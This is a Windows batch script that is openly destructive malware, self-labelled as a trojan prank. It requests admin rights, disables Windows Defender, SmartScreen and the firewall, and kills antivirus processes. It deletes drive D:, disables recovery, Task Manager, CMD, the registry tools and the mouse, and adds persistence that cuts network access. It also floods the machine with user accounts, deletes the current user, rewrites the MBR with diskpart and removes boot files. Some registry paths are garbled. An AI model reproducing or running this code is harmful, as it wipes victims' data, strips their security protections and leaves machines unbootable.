@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges to continue...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

takeown /f "%systemroot%\System32\smartscreen.exe" /a
icacls "%systemroot%\System32\smartscreen.exe" /reset
taskkill /im smartscreen.exe /f
icacls "%systemroot%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
dir d:
echo Y|del D:\

powershell.exe -command "netsh advfirewall set allprofiles state off"
net stop “Security Center”
netsh firewall set opmode mode=disable
netsh firewall set opmode mode=DISABLE
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
powershell.exe -command "Set-MpPreference -PUAProtection disable"
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell.exe -command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell.exe -command "Set-MpPreference -DisableBlockAtFirstSeen $true"
powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true"
powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"
powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"
powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /
cls
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
if not "%PROCESSOR_ARCHITECTURE%"=="AMD64" if not "%PROCESSOR_ARCHITECTURE%"=="x86" goto error
if "%PROCESSOR_ARCHITECTURE%"=="AMD64" if not "%PROCESSOR_ARCHITEW6432%"=="" goto error
if "%PROCESSOR_ARCHITECTURE%"=="x86" if "%PROCESSOR_ARCHITEW6432%"=="" goto error

setlocal EnableDelayedExpansion
set "batchPath=%~0"
set "batchPath=!batchPath:\=\\!"
for /f "tokens=*" %%a in ('%SystemRoot%\System32\cmd.exe /c %SystemRoot%\System32\runas.exe /env /user:Administrator "%batchPath%"') do (
    set "result=%%a"
)
if "%result%" == "SUCCESS: The operation completed successfully." (
    goto start
) else (
    goto error
)

:start
rem Stop the Windows Defender service
sc stop WinDefend

echo The Windows Defender service has been stopped.

:error
echo You do not have sufficient privileges to stop the Windows Defender service.

net stop "Windows Defender Service"
net stop "Windows Firewall"
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled No
cls
echo @echo off>c:removenetwork.bat
echo break off>>c:removenetwork.bat
echo ipconfig/release_all>>c:removenetwork.bat
echo end>>c:removenetwork.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:removenetwork.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:removenetwork.bat /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
taskkill /f /im explorer.exe
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  "c:\somewhere\something.bmp" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
powershell.exe -command "Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
powershell.exe -command "REG ADD “hklm\software\policies\microsoft\windows defender” /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
start https://www.youtube.com/watch?v=AK8uJcCsRDM
cd "C:\Users\volde\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo ipconfig /release > startup.bat
attrib +h +s +r startup.bat
if not "%PROCESSOR_ARCHITECTURE%"=="AMD64" if not "%PROCESSOR_ARCHITECTURE%"=="x86" goto error
if "%PROCESSOR_ARCHITECTURE%"=="AMD64" if not "%PROCESSOR_ARCHITEW6432%"=="" goto error
if "%PROCESSOR_ARCHITECTURE%"=="x86" if "%PROCESSOR_ARCHITEW6432%"=="" goto error

if not exist "%SystemRoot%\System32\diskpart.exe" goto error

"%SystemRoot%\System32\diskpart.exe" /s mbr.txt

:success
echo The MBR has been rewritten successfully.

:error
echo You do not have sufficient privileges or the diskpart utility is not available.

set IMAGE_FILE=C:\Users\User\Desktop\boot_screen.bmp
set KEY_FILE=C:\Users\User\Desktop\boot_screen_key.reg

reg export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background %KEY_FILE%

findstr /v "OEMBackground" %KEY_FILE% > %KEY_FILE%.tmp
echo OEMBackground=dword:00000001 >> %KEY_FILE%.tmp
move /Y %KEY_FILE%.tmp %KEY_FILE% > nul

reg import %KEY_FILE%

reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background /v OEMBackground /t REG_SZ /d %IMAGE_FILE% /f
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user madebygrogu troll /add
net user wenomechainsamaversion2 troll /add
net user 𝓽𝓻𝓸𝓳𝓪𝓷 death /add
net user %USERNAME% /delete
start sc.vbs
@echo off
rem ---------------------------------
rem Disable Mouse
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
rem ---------------------------------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
attrib -r -s -h c:autoexec.bat
del c:autoexec.bat
attrib -r -s -h c:boot.ini
del c:boot.ini
attrib -r -s -h c:ntldr
del c:ntldr
attrib -r -s -h c:windowswin.ini
del c:windowswin.ini
